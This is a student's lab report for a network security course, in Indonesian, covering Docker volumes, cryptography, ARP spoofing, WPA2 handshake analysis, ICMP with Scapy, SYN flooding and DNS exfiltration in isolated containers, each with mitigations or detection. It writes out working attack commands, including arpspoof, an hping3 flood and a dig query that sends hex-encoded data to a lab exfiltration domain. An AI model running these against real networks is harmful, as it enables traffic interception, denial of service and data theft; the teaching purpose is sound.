LAPORAN UTS NETWORK SECURITY
Kasus 5 — Dokumentasi Tugas 1–7

Nama: Putra Baa'di Zaelani
NIM: 24552011131
Kelas: TIF RP 24 E CNS
Mata Kuliah: Keamanan Jaringan

Penentuan Kasus

Jumlah digit NIM:

2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 1 + 3 + 1 = 25

25 mod 10 = 5

Dengan demikian, kasus yang dikerjakan adalah Kasus 5.

Parameter Praktikum
Parameter	Nilai
Container target	target-k5
Volume	vol-k5
File laporan	laporan-k5.txt
Domain DNS	k5.exfil.lab
TUGAS 1 — DOCKER DAN VOLUME
Pertemuan 1
1. Tujuan

Memahami penggunaan Docker Volume untuk menyimpan data secara persisten dan menguji komunikasi antarcontainer menggunakan Docker Compose.

2. Langkah pengerjaan dan perintah
sudo docker volume create vol-k5
sudo docker run --name w-k5 -v vol-k5:/data alpine sh -c 'echo 24552011131 > /data/laporan-k5.txt'
sudo docker rm w-k5
sudo docker run --rm -v vol-k5:/data alpine cat /data/laporan-k5.txt → 24552011131
sudo docker compose -p k5 -f b/b1-compose/docker-compose.yml up -d → container k5-target-1 dan k5-attacker-1 berhasil berjalan.
sudo docker compose -p k5 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target → berhasil menampilkan halaman default Nginx ("Welcome to nginx!").
sudo docker compose -p k5 -f b/b1-compose/docker-compose.yml down -v → container dan network dibersihkan.
3. Hasil pengujian

File laporan-k5.txt berisi NIM (24552011131) tetap terbaca dari container baru setelah container pertama (w-k5) dihapus, membuktikan data pada volume Docker bersifat persisten. Container attacker berhasil mengakses halaman Nginx milik container target melalui nama service target.

4. Kesimpulan

Docker Volume mempertahankan data meskipun container yang menulisnya sudah dihapus. Docker Compose memudahkan dua service saling berkomunikasi dalam satu jaringan.

TUGAS 2 — KRIPTOGRAFI
Pertemuan 2
1. Tujuan

Memahami enkripsi dan dekripsi menggunakan AES-256-CBC, pemeriksaan integritas dengan SHA-256, serta pembuatan sertifikat digital.

2. Langkah pengerjaan dan perintah
sudo docker run --rm -v "$PWD":/work uts-openssl sh -c \
 'echo isi laporan k5 > laporan-k5.txt && \
  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k5.txt -out laporan-k5.enc -pass pass:kunci-k5-2026 && \
  sha256sum laporan-k5.txt && \
  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k5.enc -out hasil-k5.txt -pass pass:kunci-k5-2026 && \
  sha256sum hasil-k5.txt'
sudo docker run --rm -v "$PWD":/work uts-openssl sh -c \
 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k5.pem -out cert-k5.pem -days 30 -subj /CN=k5.uts.local && \
  openssl x509 -in cert-k5.pem -noout -subject -issuer -dates'
3. Hasil pengujian

Hash SHA-256 file sebelum enkripsi dan setelah dekripsi identik:

22e90e5baa6048f9871927be4fa8af9d141b10a1071cf2b975272db8343f79b5

untuk laporan-k5.txt maupun hasil-k5.txt, membuktikan proses enkripsi-dekripsi AES-256-CBC tidak merusak data.

Sertifikat X.509 self-signed berhasil dibuat:

Field	Nilai
Subject	CN=k5.uts.local
Issuer	CN=k5.uts.local
Masa berlaku	24 Nov 2026 – 24 Des 2026 (30 hari)

Perbedaan sertifikat self-signed dan sertifikat yang ditandatangani CA: Sertifikat self-signed memiliki Subject dan Issuer yang sama karena ditandatangani sendiri oleh pemiliknya, sehingga tidak otomatis dipercaya pihak lain. Sertifikat yang ditandatangani CA memiliki Issuer berupa pihak ketiga tepercaya, sehingga dapat diverifikasi secara otomatis oleh sistem lain.

4. Kesimpulan

AES-256-CBC menjaga kerahasiaan data, SHA-256 memverifikasi integritasnya, dan sertifikat X.509 digunakan untuk identifikasi entitas secara digital.

TUGAS 3 — ARP SPOOFING
Pertemuan 3
1. Tujuan

Memahami protokol ARP, melakukan simulasi ARP spoofing pada jaringan laboratorium, dan mempelajari mitigasi menggunakan static ARP.

2. Langkah pengerjaan dan perintah
sudo docker network create --internal lab-arp-k5
sudo docker run -d --name korban-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
sudo docker run -d --name gateway-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
sudo docker run -d --name penyerang-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
sudo docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k5").IPAddress}}' korban-k5 gateway-k5 → korban 172.20.0.2, gateway 172.20.0.3 (penyerang 172.20.0.4).
sudo docker exec korban-k5 arp -a (sebelum spoofing) → gateway-k5.lab-arp-k5 (172.20.0.3) at 06:07:6d:ed:83:2c [ether] on eth0
sudo docker exec -d penyerang-k5 timeout 20 arpspoof -i eth0 -t 172.20.0.2 172.20.0.3
sudo docker exec korban-k5 arp -a (setelah spoofing)
Mitigasi: sudo docker exec korban-k5 arp -s 172.20.0.3 $(sudo docker exec gateway-k5 cat /sys/class/net/eth0/address)
sudo docker exec korban-k5 arp -a (setelah mitigasi)
3. Hasil pengujian
Kondisi	MAC untuk gateway (172.20.0.3)
Sebelum spoofing	06:07:6d:ed:83:2c
Setelah spoofing	c2:a5:0b:4f:be:c2 (identik dengan MAC penyerang-k5, 172.20.0.4)
Setelah mitigasi (static ARP, PERM)	06:07:6d:ed:83:2c

Hasil ini membuktikan: (1) sebelum spoofing, korban memetakan gateway ke MAC aslinya; (2) setelah arpspoof dijalankan, entri gateway di tabel ARP korban berubah menjadi MAC milik penyerang-k5, membuktikan spoofing berhasil; (3) setelah static ARP diterapkan, pemetaan kembali ke MAC gateway asli dengan status PERM, sehingga tidak lagi dapat diracuni oleh ARP reply palsu.

Mitigasi lain selain static ARP: Dynamic ARP Inspection (DAI) pada switch, yang memvalidasi setiap paket ARP terhadap basis data IP–MAC tepercaya (misalnya dari hasil DHCP snooping) dan menolak paket ARP yang tidak sesuai.

4. Kesimpulan

ARP spoofing berhasil mengubah pemetaan IP–MAC gateway pada tabel ARP korban. Static ARP efektif memulihkan pemetaan yang benar dan mencegah ARP reply palsu diterima kembali.

TUGAS 4 — ANALISIS WPA2 HANDSHAKE
Pertemuan 4
1. Tujuan

Memahami proses autentikasi WPA2 dan menganalisis file handshake menggunakan Aircrack-ng serta wordlist praktikum.

2. Langkah pengerjaan dan perintah
ls -lh handshake-k5.cap wordlist-k5.txt → file tersedia (handshake-k5.cap 8.1K, wordlist-k5.txt 214 bytes, 20 kandidat).
capinfos handshake-k5.cap → error: "An error occurred after reading 0 packets… appears to be damaged or corrupt (pcap: File has 1236031636-byte packet, bigger than maximum of 262144)".
aircrack-ng -w wordlist-k5.txt handshake-k5.cap → "This file is not a regular 802.11 (wireless) capture. Read 0 packets. No networks found, exiting."
xxd -l 128 handshake-k5.cap → header file diperiksa; byte awal d4 c3 b2 a1 adalah magic number pcap yang valid, namun isi selanjutnya tidak membentuk capture 802.11 yang bisa dibaca aircrack-ng.
sha256sum handshake-k5.cap → d96f9c078a8814518ceb7cdb868299796290b669f656a1042e3a9a99d9a42d3.
3. Hasil pengujian

File handshake-k5.cap yang disediakan penguji tidak dapat dianalisis oleh Aircrack-ng: capinfos melaporkan file rusak, dan aircrack-ng membaca 0 paket serta menyatakan file bukan capture 802.11 yang valid sehingga tidak ada jaringan yang ditemukan. Karena itu, tidak ada hasil KEY FOUND maupun KEY NOT FOUND yang dapat diperoleh dari file ini — prosesnya berhenti lebih awal pada tahap pembacaan file.

Empat langkah WPA2 4-way handshake (secara konsep):

Message 1 (AP → Client): AP mengirim ANonce ke client.
Message 2 (Client → AP): Client menghasilkan SNonce, menghitung PTK, mengirim SNonce beserta MIC ke AP.
Message 3 (AP → Client): AP mengirim GTK terenkripsi beserta MIC ke client.
Message 4 (Client → AP): Client mengonfirmasi penerimaan, komunikasi terenkripsi dapat dimulai.
4. Kesimpulan

Aircrack-ng memerlukan file capture 802.11 yang valid untuk dapat menguji kandidat kata sandi terhadap handshake WPA2. Pada praktikum ini, berkas yang tersedia tidak memenuhi format tersebut sehingga analisis tidak dapat dilanjutkan ke tahap pencocokan wordlist.

TUGAS 5 — ICMP DENGAN SCAPY
Pertemuan 5
1. Tujuan

Memahami protokol ICMP dan menggunakan Scapy untuk mengirim paket ICMP serta mengamati respons dari host tujuan.

2. Langkah pengerjaan dan perintah
sudo docker run --rm --network lab-arp-k5 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.20.0.2
3. Hasil pengujian
Mengirim: IP / ICMP 172.20.0.5 > 172.20.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0

Alamat pengirim 172.20.0.5 berhasil menerima balasan ICMP Echo Reply (tipe 0) dari 172.20.0.2 dengan TTL 64.

4. Pembahasan Smurf Attack

Smurf Attack merupakan serangan Denial of Service yang memanfaatkan ICMP Echo Request dan alamat broadcast: penyerang memalsukan alamat IP korban sebagai sumber paket, sehingga banyak host dalam jaringan broadcast mengirimkan balasan ICMP kepada korban secara bersamaan. Mitigasi dapat dilakukan dengan membatasi respons terhadap ICMP broadcast dan menerapkan penyaringan paket pada jaringan.

5. Kesimpulan

Scapy dapat digunakan untuk membuat dan mengirim paket ICMP secara terprogram, dan praktikum ini membuktikan mekanisme Echo Request/Echo Reply yang mendasari potensi penyalahgunaan pada Smurf Attack.

TUGAS 6 — SYN FLOOD DAN TCP THREE-WAY HANDSHAKE
Pertemuan 6
1. Tujuan

Memahami proses TCP Three-Way Handshake dan mempelajari simulasi SYN Flood secara terbatas pada lingkungan laboratorium.

2. Langkah pengerjaan dan perintah
sudo docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml up -d → k5-attacker-1, k5-target-1 berjalan.
sudo docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV → 0 (sebelum serangan).
sudo docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
Loop pemantauan 10x selama serangan: for i in $(seq 1 10); do ... exec -T target netstat -ant | grep -c SYN_RECV; sleep 1; done → hasil berurutan: 2, 1, 0, 1, 1, 0, 0, 0, 0, 0.
sudo docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10' → 12 paket tertangkap.
sudo docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml down -v
3. Pembahasan TCP Three-Way Handshake
SYN: Client meminta memulai koneksi.
SYN-ACK: Server merespons permintaan tersebut.
ACK: Client mengonfirmasi, koneksi siap digunakan.
4. Hasil pengujian
Kondisi	Jumlah SYN_RECV
Sebelum serangan	0
Selama SYN Flood (10 sampel, interval 1 detik)	2, 1, 0, 1, 1, 0, 0, 0, 0, 0

Hasil tcpdump saat satu koneksi HTTP normal dibuat menangkap 12 paket, mencakup urutan SYN → SYN-ACK → ACK, diikuti permintaan HTTP GET /, balasan HTTP/1.1 200 OK, lalu penutupan koneksi dengan FIN/ACK.

Nilai SYN_RECV naik dari 0 menjadi 1–2 segera setelah SYN flood dimulai, menunjukkan target sempat menerima permintaan SYN dalam jumlah di atas kondisi normal, meskipun nilainya kembali turun karena koneksi setengah-terbuka cepat timeout/direset pada container.

Mitigasi SYN flood: menggunakan SYN cookies — server tidak langsung mengalokasikan resource untuk tiap SYN yang masuk, melainkan menyimpan informasi koneksi dalam nomor urut SYN-ACK yang dienkode, dan baru mengalokasikan resource penuh setelah ACK balasan client terverifikasi valid.

5. Kesimpulan

SYN Flood mengirimkan permintaan koneksi TCP dalam jumlah besar yang berpotensi membebani sumber daya server. Pemantauan status koneksi (SYN_RECV) dan lalu lintas jaringan membantu mengidentifikasi aktivitas yang tidak normal.

TUGAS 7 — DNS EXFILTRATION
Pertemuan 7
1. Tujuan

Memahami penyalahgunaan DNS sebagai media pengiriman data dan mempelajari cara mendeteksi pola query DNS yang mencurigakan.

2. Langkah pengerjaan dan perintah
sudo docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml up -d → k5-dns-1, k5-attacker-1 berjalan.
echo -n 24552011131 | xxd -p → 3234353532303131313331
sudo docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131313331.k5.exfil.lab @dns → 10.0.0.99
sudo docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k5.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k5.log → Jumlah query per domain induk: exfil.lab: 1 (ditandai sebagai query mencurigakan karena label berisi hex panjang).
echo 3234353532303131313331 | xxd -r -p → 24552011131
sudo docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml down -v
3. Hasil pengujian

Log dns-k5.log mencatat satu query DNS dari 172.21.0.3 (container attacker) berupa label hex 3234353532303131313331.k5.exfil.lab, dijawab dengan 10.0.0.99. Script analisis_dns.py mendeteksi query ini di bawah domain induk exfil.lab (jumlah: 1) dan menandainya sebagai query mencurigakan karena label subdomain berisi karakter hexadecimal yang panjang. Hasil decoding xxd -r -p terhadap label tersebut mengembalikan 24552011131, sesuai NIM yang digunakan.

Mengapa teknik ini sulit diblokir firewall biasa: DNS exfiltration memanfaatkan protokol DNS yang hampir selalu diizinkan keluar oleh firewall (port 53), sehingga lalu lintasnya tampak seperti resolusi nama domain biasa dan jarang diperiksa isinya secara mendalam oleh firewall berbasis port/IP.

Indikator deteksi: panjang label subdomain yang tidak wajar (berisi string hex/base-berkarakter panjang) dibandingkan domain pada umumnya, yang dapat dikenali melalui analisis panjang string atau entropi pada log DNS.

4. Kesimpulan

DNS Exfiltration menyalahgunakan protokol DNS untuk mengirimkan data melalui query, dan analisis log DNS berbasis pola (panjang label, frekuensi per domain) dapat membantu mendeteksi aktivitas semacam ini.

KESIMPULAN AKHIR

Berdasarkan praktikum Kasus 5, tujuh materi keamanan jaringan telah dikerjakan: Docker dan Volume, Kriptografi, ARP Spoofing, Analisis WPA2 Handshake, ICMP dengan Scapy, SYN Flood, dan DNS Exfiltration. Enam dari tujuh tugas menghasilkan bukti sesuai yang diharapkan soal; Tugas 4 menghasilkan bukti berupa kegagalan pembacaan file capture oleh Aircrack-ng, yang didokumentasikan apa adanya sesuai output asli.

LAMPIRAN SCREENSHOT PRAKTIKUM
Screenshot Tugas 1

Tugas 1 - 1.png Tugas 1 - 2.png Tugas 1 - 3.png Tugas 1 - 4.png Tugas 1 - 5.png Tugas 1 - 6.png Tugas 1 - 7.png

Screenshot Tugas 2

Tugas 2 - 1.png Tugas 2 - 2.png

Screenshot Tugas 3

Tugas 3 - 1.png Tugas 3 - 2.png Tugas 3 - 3.png Tugas 3 - 4.png Tugas 3 - 5.png Tugas 3 - 6.png Tugas 3 - 7.png Tugas 3 - 8.png Tugas 3 - 9.png Tugas 3 - 10.png

Screenshot Tugas 4

Tugas 4 - 1.png Tugas 4 - 2.png Tugas 4 - 3.png Tugas 4 - 4.png Tugas 4 - 5.png Tugas 4 - 6.png

Screenshot Tugas 5

Tugas 5 - 1.png

Screenshot Tugas 6

Tugas 6 - 1.png Tugas 6 - 2.png Tugas 6 - 3.png Tugas 6 - 4.png Tugas 6 - 5.png Tugas 6 - 6.png

Screenshot Tugas 7

Tugas 7 - 1.png Tugas 7 - 2.png Tugas 7 - 3.png Tugas 7 - 4.png Tugas 7 - 5.png Tugas 7 - 6.png Tugas 7 - 7.png
